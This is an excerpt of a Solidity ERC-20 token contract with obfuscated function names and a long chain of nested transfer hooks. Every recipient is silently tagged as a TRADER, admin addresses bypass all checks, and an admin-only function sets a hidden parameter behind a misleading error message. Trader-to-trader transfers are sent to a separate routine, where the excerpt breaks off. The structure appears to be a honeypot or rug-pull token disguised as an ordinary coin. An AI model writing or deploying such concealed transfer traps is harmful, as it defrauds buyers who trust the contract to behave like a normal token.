...
abstract contract _JDIENMFConsole is Context, _JDIENMFRoleControl {
    ...
    function __JDIENMFysS(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("memberS is not a number");
        }
        memberS = num;
    }
...
contract _JDIENMFERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _JDIENMFERC20, _JDIENMFConsole {
    ...
    ) _JDIENMFERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_JDIENMFERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __JDIENMFnydbfd(from, to, amt);

    }

    function __JDIENMFnydbfd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __JDIENMFdsfrg(from, to, amt);
    }


    function __JDIENMFdsfrg(address from, address to, uint256 amt) internal {
        ...
        __JDIENMFyfbdfgd(from, to, amt);
    }

    function __JDIENMFyfbdfgd(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __JDIENMFydfdfgr(from, to, amt);
    }

    function __JDIENMFydfdfgr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __JDIENMFcvhyfyn(from, to, amt);
    }


    function __JDIENMFcvhyfyn(address from, address to, uint256 amt) internal {


        __JDIENMFfnydfte(from, to, amt);
    }

    function __JDIENMFfnydfte(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __JDIENMFmugfgey(from, to, amt);
    ...
    function __JDIENMFmugfgey(address from, address to, uint256 amt) internal {
        if(amt > 0){
